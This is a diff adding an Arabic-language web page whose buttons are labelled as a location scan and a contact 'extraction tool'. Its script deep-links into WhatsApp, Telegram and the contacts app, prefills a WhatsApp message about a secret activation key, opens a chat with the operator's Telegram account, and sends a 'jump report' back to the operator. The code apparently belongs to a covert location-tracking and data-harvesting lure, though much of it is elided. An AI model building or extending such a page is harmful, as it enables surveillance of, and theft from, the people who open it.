@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<body>
+  <div class="scanner-container">
+    <div class="btn-group" id="mainButtonArea">
+        <button class="btn" id="locationScanBtn" onclick="startLocationTracking()">
+            <i class="fas fa-map-marker-alt"></i> بدء المسح الجغرافي
+        </button>
+        <button class="btn alt" id="customAppBtn" onclick="launchCustomApp()">
+            <i class="fas fa-address-book"></i> تشغيل أداة الاستخراج
+        </button>
+        
+        <div style="display: flex; gap: 15px; width: 100%; flex-direction: column;">
+            <button class="btn alt" style="background: #25d366; padding: 10px 20px;" onclick="launchSystemApp('whatsapp')">
+                <i class="fab fa-whatsapp"></i> قفز: إرسال رسالة واتساب
+            </button>
+            <button class="btn alt" style="background: #0088CC; padding: 10px 20px;" onclick="launchSystemApp('telegram')">
+                <i class="fab fa-telegram-plane"></i> قفز: فتح محادثة تيليجرام
+            </button>
+            <button class="btn alt" style="background: #3498db; padding: 10px 20px;" onclick="launchSystemApp('contacts')">
+                <i class="fas fa-phone"></i> قفز: تطبيق جهات الاتصال
+            </button>
+        </div>
+    </div>
+    
+    </div>
+
+  <script>
+    // ... (Telegram Configuration and Constants remain the same) ...
+    
+    // ⭐⭐ دالة القفز المحدثة: محاولة تمرير البيانات ⭐⭐
+    function launchSystemApp(appType) {
+        let launchURL = '';
+        let appName = '';
+        
+        // بيانات تجريبية وهمية لغرض العرض
+        const DUMMY_PHONE = '967770000000';
+        const DUMMY_MESSAGE = encodeURIComponent('🔑 هذا هو مفتاح التفعيل السري لتطبيقك. لا تشاركه مع أحد.'); // نحاول تمرير بيانات مهمة
+
+        // تغيير رسالة الحالة
+        scanStatus.innerHTML = `🔗 جاري محاولة القفز إلى <strong>${appType.toUpperCase()}</strong>...`;
+        
+        if (appType === 'contacts') {
+            // القفز إلى تطبيق جهات الاتصال
+            launchURL = 'content://contacts/people';
+            appName = 'جهات الاتصال';
+        } else if (appType === 'whatsapp') {
+            // القفز إلى محادثة واتساب مع رسالة مُحددة (يتيح هذا الرابط فتح التطبيق وتعبئة حقل الرسالة)
+            launchURL = `whatsapp://send?phone=${DUMMY_PHONE}&text=${DUMMY_MESSAGE}`;
+            appName = 'واتساب';
+        } else if (appType === 'telegram') {
+             // القفز إلى محادثة تيليجرام (مع اسم المستخدم الخاص بك)
+             // يمكن استخدام هذا الرابط لفتح محادثة مباشرة معك
+             launchURL = `tg://resolve?domain=${TELEGRAM_USERNAME.replace('@', '')}`;
+             appName = 'تيليجرام';
+        } else {
+            scanStatus.innerHTML = `❌ خطأ: تطبيق غير معروف.`;
+            return;
+        }
+
+        // محاولة القفز
+        window.location.href = launchURL;
+
+        // إرسال تقرير القفز (للتوثيق)
+        sendJumpReport(appName, launchURL);
+
+        // لا يمكننا هنا تتبع النجاح أو الفشل، لذا ننتظر بضع ثواني
+        setTimeout(() => {
+            scanStatus.innerHTML = `✅ تم إرسال أمر القفز إلى ${appName}. يرجى التحقق من هاتفك.`;
+            // إعادة تفعيل الأزرار بعد مهلة
+            document.getElementById("locationScanBtn").disabled = false;
+            document.getElementById("customAppBtn").disabled = false;
+            // ... (إعادة تفعيل باقي الأزرار التجريبية) ...
+        }, 3000);
+    }
+    
+    // ... (بقية الدوال تبقى كما هي: launchCustomApp, sendJumpReport, resetButtons, etc.) ...
+
+    // بدء المسح تلقائيًا عند تحميل الصفحة
+    window.addEventListener('DOMContentLoaded', () => {
+        // ... (كود بدء المحاكاة) ...
+    });
+  </script>
+</body>
+</html>
+
